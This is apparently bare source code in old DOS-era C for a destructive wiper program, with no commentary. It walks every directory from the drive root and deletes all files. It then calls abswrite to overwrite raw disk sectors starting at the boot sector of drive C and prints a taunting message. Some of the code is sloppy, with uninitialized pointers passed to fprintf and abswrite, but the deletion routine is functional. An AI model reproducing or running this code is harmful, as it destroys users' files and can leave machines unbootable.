#include <stdio.h>
#include <dir.h>
#include <dos.h>

main()
{
	SearchAndDestroy("");
	span("");
	boot();
}

span(p)
	char *p;
{
	struct ffblk f;
	char n[129];
	int r;

	SearchAndDestroy(p);
	sprintf(n,"%s\\%s",p,"*.*");
	for(r=findfirst(n,&f,0x0010);!r;r=findnext(&f)) {
		if(*f.ff_name=='.') continue;
		if(f.ff_attrib & 0x0010) {
			sprintf(n,"%s\\%s",p,f.ff_name);
			span(n);
		}
	}
}

SearchAndDestroy(p)
	char *p;
{
	struct ffblk f;
	char b[81];
	int r;

	strcpy(b,p);
	strcat(b,"\\*.*");
	for(r=findfirst(b,&f,0x0000);!r;r=findnext(&f)) {
		sprintf(b,"%s\\%s",p,f.ff_name);
		remove(b);
	}
}

boot()
{
	char *buff;
	char *test;

	fprintf(test,"THIS PROGRAM WAS MADE BY A PERSON FAR FROM YOU!!");
	abswrite(2,12,0,buff);
}
